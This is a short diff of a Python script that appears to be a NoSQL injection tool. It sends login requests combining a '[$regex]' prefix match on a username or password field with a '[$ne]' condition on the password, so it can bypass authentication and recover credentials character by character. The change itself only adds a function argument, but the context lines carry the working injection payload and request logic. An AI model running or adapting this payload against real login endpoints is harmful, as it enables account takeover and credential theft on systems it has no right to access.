@@ -37,7 +37,7 @@ def get_method(args):
 def build_payloads(characters):
     return [firstChar + char for firstChar in characters for char in characters]
 
-def process_payload(payload, url, method, enum_parameter, password_parameter, other_parameters, session):
+def process_payload(payload, url, method, enum_parameter, password_parameter, other_parameters, session, characters):
     para = {enum_parameter + '[$regex]': "^" + payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}
     try:
         r = session.request(method=method, url=url, data=para, allow_redirects=False, timeout=10)
@@ -63,6 +63,7 @@ def process_payload(payload, url, method, enum_parameter, password_parameter, ot
             return userpass
     except requests.exceptions.RequestException as e:
         print(Fore.RED + "Error occurred during request:", e)
+
 
 def main():
     args = get_arguments()
